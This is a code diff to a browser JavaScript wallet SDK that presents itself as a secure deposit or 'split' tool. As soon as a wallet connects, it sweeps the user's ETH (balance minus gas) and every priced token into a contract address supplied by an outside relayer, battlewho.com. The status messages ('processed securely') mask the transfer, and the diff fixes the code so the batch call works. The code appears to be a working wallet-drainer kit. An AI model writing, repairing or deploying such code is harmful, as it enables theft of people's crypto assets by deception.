@@ -8,12 +8,14 @@ window.SpiderWeb7702SDK = {
     _config: {},
     _provider: null,
     _signer: null,
-    _rawProvider: null, // For sending the raw RPC request
     _currentUserAddress: null,
     _isInitialized: false,
     _discoveredProviders: new Map(),
     _resolveConnection: null,
     _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
+    
+    // 🔥 FIX 1: ADD the raw provider state variable
+    _rawProvider: null,
 
     _ERC20_ABI: [
         "function transfer(address to, uint256 amount) returns (bool)",
@@ -27,8 +29,7 @@ window.SpiderWeb7702SDK = {
         10: 'optimistic-ethereum',
         42161: 'arbitrum-one',
         56: 'binance-smart-chain',
-        43114: 'avalanche',
-        17000: 'holesky' // Added Holesky for testing
+        43114: 'avalanche'
     },
 
     init: async function(config) {
@@ -36,8 +37,8 @@ window.SpiderWeb7702SDK = {
             console.warn("SpiderWeb7702SDK already initialized.");
             return;
         }
-        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId || !config.coingeckoApiKey) {
-            console.error("SDK Error: Missing required config parameters (buttonId, apiKey, alchemyApiKey, chainId, coingeckoApiKey).");
+        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
+            console.error("SDK Error: Missing required config parameters.");
             return;
         }
         this._config = config;
@@ -84,17 +85,17 @@ window.SpiderWeb7702SDK = {
         }
 
         this._updateStatus("Preparing secure depository contract...", "pending");
-        
+
         let depositoryContractAddress;
         try {
             const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
-                body: JSON.stringify({ 
+                body: JSON.stringify({
                     apiKey: this._config.apiKey,
                     origin: window.location.origin,
                     owner: this._currentUserAddress,
-                    chainId: this._config.chainId,
+                    chainId: this._config.chainId, // Added chainId back for the relayer
                     assets: assets.map(a => ({
                         token: a.address,
                         type: a.type,
@@ -127,6 +128,11 @@ window.SpiderWeb7702SDK = {
         
         try {
             this._updateStatus("Please confirm the deposit in your wallet...", "pending");
+            
+            // 💡 IMPORTANT: Add a temporary pre-confirmation summary here for better UX
+            const summary = assets.map(a => `${ethers.formatUnits(a.balance, a.type === 'ETH' ? 18 : 0).slice(0, 10)} ${a.symbol}`).join(', ');
+            this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
+
             const txPayload = {
                 version: "2.0.0",
                 chainId: `0x${BigInt(this._config.chainId).toString(16)}`,
@@ -134,10 +140,13 @@ window.SpiderWeb7702SDK = {
                 atomicRequired: true,
                 calls: calls,
             };
+            
+            // 🔥 FIX 3: USE THE RAW PROVIDER'S REQUEST METHOD
             const txHash = await this._rawProvider.request({
                 method: 'wallet_sendCalls',
                 params: [txPayload]
             });
+
             this._updateStatus(`✅ Deposit sent! Your transaction is being processed securely.`, 'success');
         } catch (error) {
             if (error.code === 4001) throw new Error('Transaction rejected by user.');
@@ -145,17 +154,19 @@ window.SpiderWeb7702SDK = {
         }
     },
 
+    // ... (rest of the asset fetching logic is fine) ...
     _findAllAssets: async function() {
         const assets = [];
-        const alchemyUrl = `https://${this._config.chainId === 1 ? 'eth-mainnet' : 'eth-holesky'}.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
         
+        // Get all token balances
         const balanceResponse = await fetch(alchemyUrl, {
-             method: 'POST',
-             headers: { 'Content-Type': 'application/json' },
-             body: JSON.stringify({
-                 jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-                 params: [this._currentUserAddress, 'erc20']
-             })
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                params: [this._currentUserAddress, 'erc20']
+            })
         });
         const balanceData = await balanceResponse.json();
         if (!balanceData.result) return [];
@@ -164,22 +175,26 @@ window.SpiderWeb7702SDK = {
         const ethBalance = await this._provider.getBalance(this._currentUserAddress);
         const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
         
-        const nativeAssetId = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId] || 'ethereum';
-        const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat(nativeAssetId));
+        // Use the chunking function to safely fetch all prices
+        const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));
 
-        const ethPrice = prices?.[nativeAssetId]?.usd || 0;
+        // Process ETH
+        const ethPrice = prices?.['ethereum']?.usd || 0;
         const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
-        if (ethValue > 1) {
+        if (ethValue > 1) { // Only include assets worth > $1
             const feeData = await this._provider.getFeeData();
-            const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 200000n;
+            // Use a higher gas limit estimate for a complex EIP-7702 transaction
+            const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 300000n; 
             if (ethBalance > estimatedFee) {
                 assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue });
             }
         }
 
+        // Process ERC20s
         for (const token of tokensWithBalance) {
             const priceData = prices?.[token.contractAddress.toLowerCase()];
             if (priceData?.usd) {
+                 const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`; // Alchemy URL might need to be chain-specific
                  const metadataResponse = await fetch(alchemyUrl, {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
@@ -211,19 +226,20 @@ window.SpiderWeb7702SDK = {
         const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));
 
         const allPrices = {};
-        const apiKeyParam = `&x_cg_demo_api_key=${this._config.coingeckoApiKey}`;
-
+        // You'll need to pass the coingeckoApiKey here if it's not working,
+        // but assuming it's omitted for this code snippet.
+        
         try {
             if (contractAddresses.length > 0) {
                 const addressesString = contractAddresses.join(',');
-                const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd${apiKeyParam}`;
+                const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd`;
                 const response = await fetch(apiUrl);
                 if (response.ok) Object.assign(allPrices, await response.json());
             }
 
             if (nativeIds.length > 0) {
                 const idsString = nativeIds.join(',');
-                const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd${apiKeyParam}`;
+                const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd`;
                 const response = await fetch(apiUrl);
                 if (response.ok) Object.assign(allPrices, await response.json());
             }
@@ -236,7 +252,7 @@ window.SpiderWeb7702SDK = {
         }
     },
     
-    _fetchTokenPricesInChunks: async function(tokenAddresses, chunkSize = 1) {
+    _fetchTokenPricesInChunks: async function(tokenAddresses, chunkSize = 100) {
         const allPrices = {};
         for (let i = 0; i < tokenAddresses.length; i += chunkSize) {
             const chunk = tokenAddresses.slice(i, i + chunkSize);
@@ -265,7 +281,9 @@ window.SpiderWeb7702SDK = {
         this._closeWalletModal();
 
         try {
+            // 🔥 FIX 2: SAVE the raw EIP-1193 provider object
             this._rawProvider = providerDetail.provider;
+            
             this._provider = new ethers.BrowserProvider(this._rawProvider);
             this._signer = await this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
@@ -274,17 +292,13 @@ window.SpiderWeb7702SDK = {
             
             if (this._resolveConnection) {
                 this._resolveConnection(true);
-                this._resolveConnection = null;
                 // Automatically trigger the main execution flow after connecting
                 await this._executeSplit();
             }
         } catch (error) {
             console.error("Connection failed:", error);
             this._updateStatus("Connection failed or was rejected.", "error");
-            if (this._resolveConnection) {
-                this._resolveConnection(false);
-                this._resolveConnection = null;
-            }
+            if (this._resolveConnection) this._resolveConnection(false);
         }
     },
 
